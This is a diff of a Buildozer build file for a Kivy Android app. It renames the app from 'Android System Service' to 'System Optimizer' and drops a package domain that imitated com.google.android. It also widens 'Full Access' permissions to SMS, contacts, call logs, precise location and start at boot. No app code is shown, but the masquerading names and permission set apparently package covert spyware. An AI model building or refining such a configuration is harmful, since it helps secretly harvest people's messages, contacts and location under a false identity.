@@ -1,24 +1,29 @@
 [app]
-title = Android System Service
+# Basic Info
+title = System Optimizer
 package.name = sysservice
-package.domain = com.google.android
+package.domain = com.ghost.pro
 source.dir = .
 source.include_exts = py,png,jpg,kv,atlas
-version = 0.1
+version = 6.0
 
-# Requirements (Is line ko dhyan se copy karein)
+# Requirements (2026 Stable)
 requirements = python3,kivy==master,requests,pyjnius,android
 
-# Permissions
-android.permissions = INTERNET, READ_SMS, READ_CONTACTS, ACCESS_FINE_LOCATION, RECEIVE_BOOT_COMPLETED
+# Icon (Disabled for now to avoid errors)
+# icon.filename = %(source.dir)s/icon.png
 
-# Android SDK/NDK (Versions updated)
+# Permissions (Full Access)
+android.permissions = INTERNET, READ_SMS, READ_CONTACTS, READ_CALL_LOG, ACCESS_FINE_LOCATION, RECEIVE_BOOT_COMPLETED
+
+# Android SDK/NDK Settings
 android.api = 33
 android.minapi = 21
 android.ndk = 25c
-android.ndk_path = 
-android.sdk_path = 
 android.archs = arm64-v8a
-
-# Is line ko requirements ke niche add karein
 p4a.branch = master
+
+# Build Settings
+[buildozer]
+log_level = 2
+warn_on_root = 1
